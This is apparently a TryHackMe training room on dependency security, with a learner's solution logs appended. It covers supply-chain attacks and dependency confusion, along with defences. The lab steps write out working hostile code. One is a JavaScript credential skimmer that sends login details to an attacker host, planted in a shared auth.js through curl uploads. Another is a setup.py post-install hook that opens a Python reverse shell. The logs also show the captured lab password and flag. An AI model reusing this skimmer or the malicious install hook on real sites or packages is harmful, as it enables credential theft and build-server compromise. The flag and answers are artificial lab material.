---
Learn about the security concerns regarding dependency management in the automated DevOps pipeline.
---
![](https://assets.tryhackme.com/room-banners/pipelines.png)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/317702e9ed406144f96699d72b09ef9c.png)

### Introduction

It is very uncommon in modern times to find an application written completely from scratch. Furthermore, writing it completely from scratch is probably a bad idea since you will most likely introduce vulnerabilities by trying to reinvent the wheel. Instead, modern applications make extensive use of libraries and Software Development Kits (SDKs) that assist with the basic (and sometimes complex) features of the application, allowing the developer to focus purely on the key features and functionality of the application.

These libraries and SDKs are called dependencies since our application depends on them. While dependencies make our lives a lot easier, they have to be securely managed since they now form part of the overall attack surface of the application. In this room, we will learn about security concepts associated with dependency management and show how a specific dependency management issue can be exploited by an attacker.  

Learning Objectives  
  
This room will teach you about the following concepts: 

-   Security principles of dependency management
-   Securing external and internal dependencies
-   Dependency confusion attacks  
    

Answer the questions below

I'm ready to learn about dependency management.  

Question Done


### What are dependencies?

The Scale of Dependencies  

While you may think that you are writing an incredible amount of code when you are developing an application, it pales in comparison to the amount of code that is actually performing actions for you in the various dependencies that you include. Let's take a look at a simple Python example.

example.py

```python
#!/usr/bin/python3
#Import the OS dependency
import numpy

x = numpy.array([1,2,3,4,5])
y = numpy.array([6])
print(x * y)
```

In this example, we are using the NumPy library to create two arrays and then multiply them with each other. We effectively wrote about four lines of code. However, just that first line, `import numpy`, executes a `__init__.py` file in the background that contains 400 lines of code with an additional 30 imports. With a conservative estimate of 250 lines of code per import, this means that our one line of code has executed roughly 8000 lines of dependency code!

If we extrapolate this data, you are probably only responsible for 0.01% of all the code in your application, and dependencies make up the remaining 99.99% of the code! This is why dependency management is vital for the security of any pipeline or software development lifecycle (SDLC) process.

Dependency Management

Dependency management is the process of managing your dependencies through your SDLC process and DevOps pipeline. We perform dependency management for several reasons:

-   Knowing what dependencies our application uses can allow us to support it better.
-   We often want to version lock dependencies to improve the stability of our application since newer versions may add new features or deprecate features that our application actively uses.
-   We can build golden images that already have all our dependencies installed, meaning we can perform faster deployment cycles.
-   When new developers are onboarded, we can help them set up their development machine by installing all the required dependencies.
-   We can monitor the dependencies we use for security issues to ensure that dependencies are upgraded with the security fixes as needed.

Most large organisations use tools for dependency management, such as [JFrog Artifactory](https://jfrog.com/artifactory/). This allows the organisation to manage all of their dependencies from a central location and allows dependency management to be integrated into our DevOps pipeline. Build servers and agents can make requests to the dependency manager to be provided with dependencies when the application is being built or deployed.﻿

Answer the questions below

What do we call the libraries and SDKs that are imported into our application?

*Dependencies*

### Internal vs External

While dependencies can be classified using various classifications, for this room, we will focus primarily on one classification, namely the origin of the dependency. Hence, our dependencies can be classified as external or internal dependencies.

External Dependencies

An external dependency is one that has been developed and maintained outside of our organisation. Usually, these dependencies are publicly available (some are free, but some can be paid for SDKs). Some examples of popular external dependencies include:

-   Any Python pip package that you install from the PyPi public repositories.
-   JQuery and any other publicly available Node Package Manager (NPM) libraries, such as VueJS or NodeJS.
-   Paid for SDKs such as Google's ReCaptcha SDK that can be used to integrate captchas into your application.  
    

External dependencies include almost any dependency that we ourselves have not created. This means that someone outside our organisation is responsible for maintaining the dependency.

Internal Dependencies

An internal dependency is one that has been developed by someone in our organisation. These dependencies are usually only used by applications that we develop internally in our organisation. Some examples of internal dependencies include:

-   An authentication library that standardises the authentication processes of all our internally developed applications.
-   A data-source connection library that provides applications with various techniques to connect to different data sources.
-   A message translation library that can convert application messages from a specific format to one that a different internal application can read.

Internal dependencies are usually created to standardise an internal process and ensure that we don't have to reinvent the wheel every time we want that same feature in another application. Since we develop these dependencies ourselves, we, as an organisation, are responsible for maintaining these dependencies.

External vs Internal

The origin of the dependency does not necessarily make it better or more secure. However, based on the origin of the dependency, the attack surface is different. Meaning we will need to take different security measures to protect each. In this room, we will talk about these security measures for both external and internal dependencies before practically exploiting one of the security concerns internal dependencies have.

Answer the questions below

Would an authentication library that we created be considered an internal or external dependency?  

*internal*

Would JQuery be considered an internal or external dependency?

*external*


### Securing External Dependencies

 Start Machine

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/e7c88e060a4f574ca216a94eecf0408b.png)  

As mentioned before, external dependencies are ones that are hosted, managed, and updated by external parties. External dependencies are an interesting part of the SLDC to secure since we are not directly responsible for the security of the dependency. Still, if we want a secure application, we will have to manage these dependencies. In this task, let's take a look at some of the security concerns with external dependencies before executing a supply chain attack.

Public CVEs

The team that develops external dependencies are not robots who don't make mistakes. They are humans, just like the rest of us. This means there may be vulnerabilities in the code that they have written. The issue, however, is that these vulnerabilities will be publicly disclosed, usually as a Common Vulnerabilities and Exposures (CVE), once the developers have created a patch. While this is good practice to ensure that developers create patches, for us, it is a problem since it means that our specific version of their dependency is now vulnerable to an issue that is advertised to attackers online.

As such, we must react as soon as possible and patch our dependency. But this is easier said than done. We may have version locked a dependency for the stability of our application. So upgrading to a new version means we will first have to determine whether such an upgrade could cause instability. The problem gets even worse when you start to talk about dependencies of dependencies. It is perhaps not the SDK that you are using that is vulnerable, but a dependency of the SDK, that is. Since that dependency has to be updated, we will also now need to update our SDK.

Log4j is a prime example of how bad this can truly get. Log4j is a Java-based logging utility. It was used in almost every application that was developed in Java. This led to several products becoming vulnerable when a vulnerability was discovered in the dependency. You can look [here for the full list of impacted products](https://github.com/cisagov/log4j-affected-db). The list got so big, more than 1000 products, that they had sorted it alphabetically.

Depending on the discovered vulnerability, it will impact the risk associated with the specific dependency. Since Log4j's vulnerability allowed for remote code execution, the impact was significant. If you would like to explore this issue more, have a look at [this room](https://tryhackme.com/room/solar).  

Supply Chain Attacks

Even if dependencies do not have any vulnerabilities and are kept up to date, they can still be leveraged to attack systems and services. As more and more organisations are becoming security conscious and making it harder for an attacker to compromise them, attackers had to become more crafty.

Instead of trying to attack the application directly, which has been hardened, an attacker instead targets one of the dependencies of the application, which may have been created by a smaller team that does not have such a large security budget. These indirect attack methods are called supply chain attacks.

One advance persistent threat (APT) group, namely the MageCart group, was notorious for performing these types of attacks. Some highlights of their actions:

-   Compromising the payment portal of British Airways' online portal led to the compromise of credit cards of customers and a fine for BA of 230 million dollars.
-   Compromising more than 100000 customers' credit cards by embedding skimmers in various payment portals of various applications.
-   Compromising more than 10000 AWS S3 buckets and embedding malware in any JavaScript found in these buckets.

The MageCart group showed that you do not really have to target an application directly. It is far more lucrative to compromise a dependency used by the application. These supply chain attacks are even more effective since a dependency might be used by several applications. Meaning the compromise of a single dependency could lead to the compromise of several applications.

There are several ways to compromise dependencies, but by far, the most common is when dependencies are insecurely hosted, allowing an attacker to alter the dependency. This could be, for example, an S3 bucket that has world-writeable permissions configured. An attacker could abuse these permissions to overwrite the hosted dependency with malicious code.

Exploiting Supply Chains  

Let's try to perform a supply chain attack. We will simulate a supply chain attack. Start the attached machine, the AttackBox, and navigate to [http://MACHINE_IP:8000/](http://machine_ip:8000/) using the FireFox on the AttackBox once the machine is active. You will see that this is a simple authentication portal.

Before we can continue, we need to embed a hostname entry to simulate the internet-facing S3 bucket. Perform the following command on your attack machine to inject the hostname into your /etc/hosts file:

`sudo bash -c "echo 'MACHINE_IP cdn.tryhackme.loc' >> /etc/hosts"`  

Once injected, you can refresh the web page and should see the dependency loading. If you inspect the code of the application (Right click->View Source), you will see that it pulls a dependency from cdn.tryhackme.loc. Let's inspect this dependency a little bit more. Open a link to that dependency, and it should allow you to download a JavaScript library called auth.js:

```javascript
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {    
	if (event.key == "Enter") {
		event.preventDefault();
        	document.getElementById("loginSubmit").click();
	}
});
```

  

Taking a closer look at the code in this library, it seems to add a JS event that will monitor the password textbox for keystrokes and automatically submit the login form if a user presses enter. With no real vulnerability in the code, let's take a look at where the dependency is being hosted.  

If we go back one step in the request to [http://cdn.tryhackme.loc:9444/libraries,](http://cdn.tryhackme.loc:9444/libraries) we can see that this seems to be an S3 bucket hosting the dependency:

`<?xml version="1.0" encoding="UTF-8"?><ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">`  

A quick way to see if the team perhaps misconfigured the S3 bucket to grant world-writeable permissions would be to try a simple PUT request:

`curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"`  

Running this request, it seems that we get an HTTP 200 OK. We can also see that we have the ability to download this new file using [http://cdn.tryhackme.loc:9444/libraries/test.js](http://cdn.tryhackme.loc:9444/libraries/test.js). This is looking positive for a supply chain attack! At this point, there are several different ways we could go about exploiting this world-writeable S3 bucket to cause a supply chain attack, but we will keep it simple by embedding a credential skimmer that will send us the user's credentials when they click submit.

Download the auth.js dependency and modify the code to look something like this:

```javascript
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {    
	if (event.key == "Enter") {
		event.preventDefault();
        try {
            const oReq = new XMLHttpRequest();
            var user = document.getElementById('txtUsername').value;
            var pass = document.getElementById('txtPassword').value;
            oReq.open("GET", "http://THM_IP:7070/item?user=" + user + "&pass=" + pass);
            oReq.send();
        }
        catch(err) {
            console.log(err);
        }
		function sleep (time) {
                    return new Promise((resolve) => setTimeout(resolve, time));
                }
                sleep(5000).then(() => {
    		    document.getElementById("loginSubmit").click();
                });
	}
});
```

  

**Code explained**: Make sure to modify THM_IP to be the IP of your TryHackMe VPN or the AttackBox IP since we want callbacks to occur to this host. The injection is fairly simple. Once the user presses enter to submit their credentials, we make an XHR (XMLHTTPRequest) request to our host, where the username and password of the target are embedded as parameters in the request. You will notice some lines of code for the creation of a sleep function and then using said sleep function before the button is clicked. This is to ensure that the malicious XHR request has completed before the page transition occurs, otherwise a modern browser would stop the request from occurring.  

Let's overwrite the existing auth.js file with our embedded skimmer:

`curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js`  

We could host an entire server to receive the keystrokes, but let's keep it simple with a Python server:

`python3 -m http.server 7070`  

We can test if our skimmer is working by using the website ourselves. Complete the form and press enter after typing in your password, and you should intercept credentials:

`10.10.62.64 - - [10/Aug/2022 10:59:28] "GET /item?user=test&pass=test HTTP/1.1" 404 -`  

If this works, we now just need to wait for someone to authenticate! Give it 5 minutes, and you should intercept credentials from an actual user! Once you have intercepted the user's credentials, use them to authenticate to the website and recover the flag!  

Defences

It is difficult to defend against the attacks staged against external dependencies since there are so many and new vulnerabilities are found daily. However, there are certain things that we can do to limit the risk:

-   Make sure to update and patch dependencies on a regular basis. This would include emergency patching of dependencies if a sufficiently serious vulnerability was discovered.
-   Dependencies can sometimes be copied and hosted internally. This will reduce the attack surface.
-   Sub-resource Integrity can be used to prevent tampered JS libraries from loading. In the HTML include, the hash of the JS library can be added. Modern web browsers will verify the hash of the JS library, and if it does not match, the library will not be loaded.  
    

Answer the questions below

```javascript
Without adding to host and checking source code cannot access to auth.js

<html>
<body>


Hello there, please authenticate to this website
	<form action="auth.php" method="post">
		Username: <input id="txtUsername" type="text" name="username"><br>
		Password: <input id="txtPassword" type="password" name="password"><br>
		<input id="loginSubmit" type="submit">
	</form>

<script type="text/javascript" src="http://cdn.tryhackme.loc:9444/libraries/auth.js"></script>

</body>
</html>

sudo bash -c "echo '10.10.92.0 cdn.tryhackme.loc' >> /etc/hosts"

now we can see it

//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {
	if (event.key == "Enter") {
		event.preventDefault();
		document.getElementById("loginSubmit").click();
	}
});

http://cdn.tryhackme.loc:9444/libraries/

<ListBucketResult>
<Name>libraries</Name>
<MaxKeys>1000</MaxKeys>
<Marker/>
<Prefix/>
<Contents>
<Key>auth.js</Key>
<LastModified>2022-08-08T10:24:44Z</LastModified>
<Size>379</Size>
<StorageClass>STANDARD</StorageClass>
<ETag>76ff407f08617fef5ae8d8fa5c166f04</ETag>
</Contents>
<IsTruncated>false</IsTruncated>
</ListBucketResult>

http://cdn.tryhackme.loc:9444/libraries/test.js

<Error>
<Code>NoSuchKey</Code>
<Message>Object does not exist</Message>
<Resource>/libraries/test.js</Resource>
</Error>

root@ip-10-10-30-245:~# curl -X PUT http://cdn.tryhackme.loc:9444/libraries/test.js -d "Testing world-writeable permissions"

now can we download it

Testing world-writeable permissions

credential skimmer

root@ip-10-10-30-245:~# nano auth.js
root@ip-10-10-30-245:~# cat auth.js 
//This is our shared authentication library. It includes a really cool function that will autosubmit the form when a user presses enter in the password textbox!

var input = document.getElementById('txtPassword');
input.addEventListener("keypress", function(event) {    
	if (event.key == "Enter") {
		event.preventDefault();
        try {
            const oReq = new XMLHttpRequest();
            var user = document.getElementById('txtUsername').value;
            var pass = document.getElementById('txtPassword').value;
            oReq.open("GET", "http://10.10.30.245:7070/item?user=" + user + "&pass=" + pass);
            oReq.send();
        }
        catch(err) {
            console.log(err);
        }
		function sleep (time) {
                    return new Promise((resolve) => setTimeout(resolve, time));
                }
                sleep(5000).then(() => {
    		    document.getElementById("loginSubmit").click();
                });
	}
});


root@ip-10-10-30-245:~# curl http://cdn.tryhackme.loc:9444/libraries/auth.js --upload-file auth.js

root@ip-10-10-30-245:~# python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
10.10.92.0 - - [22/Feb/2023 17:58:06] code 404, message File not found
10.10.92.0 - - [22/Feb/2023 17:58:06] "GET /item?user=superuser&pass=supersecretpassword12345@ HTTP/1.1" 404 -

Welcome superuser
Your password is: supersecretpassword12345@

Well done, the flag is: THM{Supply.Chain.Attacks.Are.Super.Powerful}


```


Which Advance Persistent Threat group is notorious for their supply chain attacks?  

*MageCart*

What is the password of the intercepted credentials?  

*supersecretpassword12345@*

What is the value of the flag you receive on the website after authenticating with the intercepted credentials?

*THM{Supply.Chain.Attacks.Are.Super.Powerful}*

### Securing Internal Dependencies

Internal dependencies are any libraries or SDKs that we have developed internally in our organisation. As such, we are responsible for all aspects of the security of the dependency and its management. As mentioned before, the primary reason for creating internal dependencies is to ensure that we don't have to reinvent the wheel every time we develop an application. Internal dependencies allow us to standardise certain processes, such as authentication, registration, and communication.

Security Concerns  

Internal dependencies have similar security concerns as external dependencies. Although internal dependencies allow us to standardise a process, if the dependency has a vulnerability, it will affect several different applications in the organisation. We, therefore, have to perform security testing of our dependencies before they are released for use.

Another issue is that internal dependencies can become legacy code incredibly fast. The developer that created and maintained a dependency has started work elsewhere, meaning the dependency no longer receives updates. If such a dependency is used in several applications, it can become an issue if a vulnerability is discovered. This problem can only be made worse if the documentation is not kept up to date, allowing someone new to take responsibility for the dependency.

A unique security concern to internal dependencies is storage. We want to ensure that a dependency can be accessed by all developers for use, but not modification. If all developers can simply modify the dependency, an attacker would simply have to compromise a single developer to compromise several applications. Hence we need to protect write-access to dependencies. In some organisations, even read access is restricted to reduce the attack surface further.

Tools

Applications and tools must be used to manage internal dependencies effectively. These tools would differ based on our needs. If we develop code only in a single language such as Python, we could simply host an internal PyPi repository server. This would allow us to upload and install packages similar to how it is performed using pip and the internet-facing PyPi repository.

However, if we develop applications in different languages, we may opt to use a dependency manager such as [JFrog Artifactory](https://jfrog.com/artifactory/). JFrog Artifactory allows dependencies to be centrally managed and integrated into the DevOps pipeline. As developers are writing code, they can make use of the various dependencies hosted on Artifactory. Artifactory also has the ability to manage external dependencies that are used internally as well. It provides a single source for all dependencies.

While such tools are great to help us manage dependencies internally, if they are compromised, it would lead to a significant impact. One such attack that can be performed against dependency managers is Dependency Confusion, which will be discussed in more detail in the next task.  

Answer the questions below

What do we call a dependency that we have created ourselves and are responsible for maintaining?  

*Internal Dependency*

### Theory of a Dependency Confusion

Dependency Confusion is a vulnerability that can exist if our organisation uses internal dependencies that are managed through a dependency manager. In short, a race condition can be created by an attacker that could lead to a malicious dependency being used instead of the internal one. In this task, we will look into the theory of a Dependency Confusion vulnerability before practically exploiting one in the next task.

Background

Dependency Confusion was discovered by [Alex Birsan in 2021](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610). The issue stems from how internal dependencies are managed. Let's take a look at a simple example in Python:

`pip install numpy`

What actually happens in the background when we run this command? When we run this command, pip will connect to the external PyPi repository to look for a package called numpy, find the latest version, and install it. In the past, there have been some interesting ways this package could be compromised through a supply chain attack:

-   **Typosquatting** - An attacker hosts a package called `nunpy`, hoping that a developer will mistype the name and install their malicious package.
-   **Source Injection** - An attacker contributes to the package for a new feature through a pull request but also embeds a vulnerability in the code that could be used to compromise applications that make use of the package.
-   **Domain Expiry** - Sometimes, the developers of packages may forget to renew the domain where their email is being hosted. If this happens, an attacker can buy the expired domain, allowing them full control over email, which could be used to reset the password of a package maintainer to gain full control over the package. This is a common risk for legacy packages on these external repositories.

There are several other supply chain attack methods, but all of them target the dependency or its maintainers directly. If we wanted to use pip to install an internal package and we followed the example on [StackOverflow](https://stackoverflow.com/questions/55310229/pip-install-package-from-artifactory-and-install-dependencies-from-pypi) (like all good developers do), our build step would look something like this:

`pip install numpy --extra-index-url https://our-internal-pypi-server.com/`  

The `--extra-index-url` argument tells pip that an additional Pypi server should be inspected for the package. But what if numpy exists in both the internal repo and the external, public-facing PyPi repo? How does pip know which package to install? Well, it's simple, it will collect the package from all available repos, compare the version numbers, and then install the package with the highest version number. You should start to see the problem here.

Staging a Dependency Confusion Attack

All an attacker really needs to stage an internal dependency attack is the name of one of your internal dependencies. While this might seem like a challenge, it happens more frequently than you would expect:

-   Developers often ask questions on public forums such as StackOverflow but do not obfuscate sensitive information such as the names of libraries being used, some of which could be internal dependencies.
-   Some compiled applications like NodeJS will often disclose internal package names in their `package.json` file, which is usually exposed in the application itself.

Once an attacker learns the name of an internal dependency, they can attempt to host a package with a similar name on one of the external package repos but with a higher version number. This will force any system that attempts to build the application and install the dependency to get confused between the internal and external package, and if the external one is chosen, the attacker's dependency confusion attack will succeed. The full attack is shown in the diagram below:

![Diagram for showing dependency confusion](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/32b158ecec6d8ed7fbad6d97630cc414.png)  

Considerations

There are a couple of things that should be kept in mind:

-   Since we only know the name of the internal package, not the actual source code of the package, if we perform a dependency confusion attack, the build process of the pipeline will most likely fail at a later step since the actual package was not installed.
-   Our external version number must be higher than the version number of the internal package for the confusion to work in our favour. However, this is easy since we can simply have a package with version number 9000 since most packages have major version numbers lower than 10.
-   Dependency confusion can affect any type of package, such as Python pip packages, JavaScript npm packages, or Ruby gems packages. We will demonstrate the attack through Python for simplicity.  
    

Let's look at practically performing a dependency confusion attack in the next task.  

Answer the questions below

What is the name of a common supply chain attack that relies on users mistyping the names of packages that they wish to install?  

*Typosquatting*

Dependency confusion relies on a race condition of what of a package?

*version*


###  Practical Exploitation of Dependency Confusion

 Start Machine

Terminate the machine from Task 4 and start the machine attached to this task to perform the dependency confusion exercise. If your AttackBox is no longer active, you will also have to redeploy it. We will have to simulate the external Pypi package repository since uploading malicious packages is against Pypi's terms of service. To ensure that you can access this repo and the application, use the following command to add an entry to your `/etc/hosts` file:

`sudo bash -c "echo 'MACHINE_IP external.pypi-server.loc' >> /etc/hosts"`

Environment Explained

This machine simulates a build environment that has the following:

-   Internal Dependency Manager - Pypi
-   Build Server - Docker-Compose

The build environment will rebuild an API application every 5 minutes. Once you have given the machine a couple of minutes to start, you can verify that the API is working by running the following:

`curl http://MACHINE_IP:8181/api/list`  

You should see that the API responds with a dataset. If you don't get a response, wait another 5 minutes and then try again.

Dependency Disclosure  

The developer of the application has posted a question on a public forum:

_Upload Package to Internal Pypi Server_

_Hi all, how would I upload a pip package to our internal Pypi server? I know I would use the following to upload it externally, but what should I change?_

`twine upload dist/datadbconnect-0.0.2.tar.gz`

_Is there a flag or something that I can add?_

In the post, the developer seems to have disclosed the name of an internal package, **datadbconnect**. This is all we need to get started on our Dependency Confusion attack!

Remote Code Execution in the Installation Step

To stage a Dependency Confusion attack, we will need to develop and build a malicious package that will execute code once installed. Since we only know the name of the package and don't have access to the source code, the application will most likely fail once it tries to run our package, so our safest bet is to get remote code execution earlier in the process. Hence, we want remote code execution once the package installation completes.

This is probably a good place to explain how Pip packages are built from Python code. If you want to explore the process in more depth, have a look at tutorials like [this](https://www.freecodecamp.org/news/how-to-create-and-upload-your-first-python-package-to-pypi/). Here we will give a quick overview. The most basic Pip package requires the following structure:

```python
package_name/
    package_name/
    __init__.py
    main.py
    setup.py
```

-   **package_name** - This is the name of the package that we are creating. In our case, it will be datadbconnect
-   **__init__.py** - Each Pip package requires an init file that tells Python that there are files here that should be included in the build. In our case, we will keep this empty.  
    
-   **main.py** - The main file that will execute when the package is used. We will create a very simple main file.
-   **setup.py** - This is the file that contains the build and installation instructions. When developing Pip packages, you can use setup.py, setup.cfg, or pyproject.toml. However, since our goal is remote code execution, setup.py will be used since it is the simplest for this goal.  
    

Recreate this folder structure for your malicious package. Add the following code to your main.py:

```python
#!/usr/bin/python3
def main():
   print ("Hello World")

if __name__=="__main__":
   main()
```

This is simply filler code to ensure that the package does contain some code for the build. The more important part is the setup.py code. Let's take a look at what a normal setup.py file would look like:

```python

from setuptools import find_packages
from setuptools import setup

VERSION = 'v0.0.1'
 
setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
)
```

In order to inject code execution, we need to ensure that the package executes code once it is installed. Fortunately, setuptools, the tooling we use for building the package, has a built-in feature that allows us to hook in the post-installation step. This is usually used for legitimate purposes, such as creating shortcuts to the binaries once they are installed. However, combining this with Python's os library, we can leverage it to gain remote code execution. Update your setup.py file with the following:

```python
from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys

VERSION = 'v9000.0.2'

class PostInstallCommand(install):
     def run(self):
         install.run(self)
         print ("Hello World from installer, this proves our injection works")
         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
        cmdclass={
            'install': PostInstallCommand
        },
)
```

Let's take a look at the adjustments that we made. Firstly, we imported the install library from setuptools and the os library:

```python
from setuptools.command.install import install
import os
import sys
```

We also updated the version of our package to ensure that we win the dependency confusion race:

```python
VERSION = 'v9000.0.2'
```

Next, we introduced a new function that will work as a post-installation hook to run a reverse shell for us. Remember to add your AttackBox or VPN IP:

```python
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        print ("Hello World from installer, this proves our injection works")
        os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')
```

Lastly, we hook the post-installation process in our setup configuration:

```python
cmdclass={
        'install': PostInstallCommand
    },
```

Now that we have created the package, it is time to build it and upload it to the external PyPI repo. We can use the following command to build our package:

`python3 setup.py sdist`

Once built, our Pip package will be available under the dist folder and can be uploaded to the Pypi repo using twine:

`twine upload dist/datadbconnect-9000.0.2.tar.gz --repository-url http://external.pypi-server.loc:8080`

If you are asked for credentials, just leave them empty. You can also safely ignore the error and warning messages as long as the final output shows the package upload reaching 100%. Just a reminder again that we are simulating an external PyPI repo to not break their terms of service. If this were a real attack, the package would be uploaded to PyPI's main [repo](https://pypi.org/). Let's start a listener for our shell:

`nc -lvp 8080`

We can test the code execution of our package by installing it directly ourselves:

`pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose`

You should see the print line in the output of the installation command and see that pip freezes when you get a reverse shell connection:

AttackBox Terminal

```shell-session
[thm@thm]$ nc -lvp 8080
Listening on 0.0.0.0 8080
Connection received on localhost 50098
$ whoami
root
```

If this works, restart your listener and wait for about 5 minutes, you should magically get a callback from the build server once it tries to rebuild the docker container and installs our malicious package!

Explaining what is Happening in the Background

So how is this actually happening? Let's take a dive into the vulnerable line in the DockerFile:

`RUN pip3 install datadbconnect --no-cache-dir --trusted-host internal.pypi-server.com --extra-index-url "http://internal.pypi-server:8081/simple/"`

Knowing that this is an internal package, the developer team added an additional Pypi repo for Pip through the `--extra-index-url` argument. However, this does not force Pip to download the package from that location. Rather, it is just another location where it can look for the package. Pip will therefore download the package from _internal.pypi-server.com_ (legitimate package) and _external.pypi-server.loc_ (our malicious package) and compare the two versions. Since our version is higher, it will install our package instead! This is where the name Dependency Confusion comes from!

Defences

Protecting internal dependencies is a massive security endeavour. Since we have to create, maintain, and host these dependencies ourselves, the security project is much larger than that of external dependencies. The following defence strategies should be considered for all internal dependencies:

-   Internal dependencies should be actively maintained. This will ensure that vulnerabilities in these dependencies do not affect multiple applications and services.
-   The hosting infrastructure of internal dependencies should be secured. The following [Microsoft whitepaper](https://azure.microsoft.com/mediahandler/files/resourcefiles/3-ways-to-mitigate-risk-using-private-package-feeds/3%20Ways%20to%20Mitigate%20Risk%20When%20Using%20Private%20Package%20Feeds%20-%20v1.0.pdf) provides the following three key focus areas:

-   Reference one private feed, not multiple. This contributes to protecting against dependency confusion attacks. With our python example, we would then use `--index-url` argument instead of `--extra-index-url` to indicate that the package must be collected from the specified index.  
    
-   Protect your packages using controlled scopes. By controlling the scopes of dependencies, it will ensure that dependencies are locked to the applications that require them.
-   Utilise client-side verification features. Controls such as sub-resource integrity or version locking will ensure that applications and services will detect when malicious code is introduced into a dependency and refuse to execute it.

-   As an additional defence measure against dependency confusion attacks, the names of internal dependencies can be registered on external package managers without the source code to claim the name. This will prevent an attacker from registering a similarly named package.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo bash -c "echo '10.10.68.245 external.pypi-server.loc' >> /etc/hosts"
[sudo] password for witty: 
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ tail /etc/hosts
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

#10.10.188.193 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca

127.0.0.1 irc.cct
10.10.92.0 cdn.tryhackme.loc
10.10.68.245 external.pypi-server.loc

A build server is a dedicated computer or server that is responsible for building software, typically from source code. It compiles the code, runs any necessary tests, and creates the final executable or software package that is ready to be deployed to other servers or client machines.

Docker Compose, on the other hand, is a tool for defining and running multi-container Docker applications. It allows you to define a set of Docker containers and their dependencies in a single configuration file, making it easier to manage and deploy complex applications. With Docker Compose, you can spin up multiple containers with a single command, define their networking and storage requirements, and manage their lifecycle as a single application.

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.68.245:8181/api/list
{"message":"Accepted","values":[1,2,3,4,5,6,7,8,9,10]}

`twine upload dist/datadbconnect-0.0.2.tar.gz` is a command used to upload a Python package to the Python Package Index (PyPI) using Twine.

Here's what each part of the command means:

-   `twine`: the command-line tool used to upload Python packages to PyPI
-   `upload`: the subcommand that tells Twine to upload a package
-   `dist/datadbconnect-0.0.2.tar.gz`: the path to the package that you want to upload. This assumes that the package has already been built and saved to the `dist` directory using the `python setup.py sdist` command.

When you run this command, Twine will prompt you for your PyPI username and password, and then it will upload the package to PyPI. Once the upload is complete, the package will be available for other users to install using the `pip` package manager.

┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir confusion_dependency
                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ cd confusion_dependency 
                                                                                   
┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ nano main.py
                                                                                   
┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ cat main.py            
#!/usr/bin/python3
def main():
   print ("Hello World")

if __name__=="__main__":
   main()

real version

┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ nano setup.py     
                                                                                   
┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ cat setup.py 
from setuptools import find_packages
from setuptools import setup

VERSION = 'v0.0.1'
 
setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),


rce version

┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ nano setup.py 
                                                                                   
┌──(witty㉿kali)-[~/Downloads/confusion_dependency]
└─$ cat setup.py 
from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys

VERSION = 'v9000.0.2'

class PostInstallCommand(install):
     def run(self):
         install.run(self)
         print ("Hello World from installer, this proves our injection works")
         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

setup(
        name='datadbconnect',
